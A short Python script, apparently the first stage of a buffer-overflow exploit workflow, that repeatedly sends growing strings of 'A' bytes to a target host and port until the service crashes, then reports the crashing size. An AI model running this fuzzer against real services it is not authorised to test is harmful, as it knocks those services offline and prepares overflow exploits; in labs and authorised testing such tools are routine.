#!/usr/bin/env python3
# usage: ./stage1.py [ip] [port]
import socket,sys,time
from termcolor import colored,cprint

RHOST = sys.argv[1]
RPORT = int(sys.argv[2])

payload = "\x41"
payload_size = 50 
postfix = "\n"

while True:
    try:
        # setup payload
        buff = payload * payload_size + postfix
        buff_size = len(buff) - len(postfix) 

        # payload status
        print(colored("[+] - Sending Payload - [ {} Bytes ]".format(buff_size), "red"))

        # handle connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((RHOST, RPORT))
        s.sendall(buff.encode('utf-8'))

        # handle response
        response = s.recv(1024)
        # print("Received: {}".format(response))

        s.close()
        
        payload_size += 10
        time.sleep(2)       
    except:
        print(colored("[!] - Crash Detected  -> [ {} Bytes ]".format(buff_size), "green", attrs=["bold", "blink"]))
        sys.exit(0)


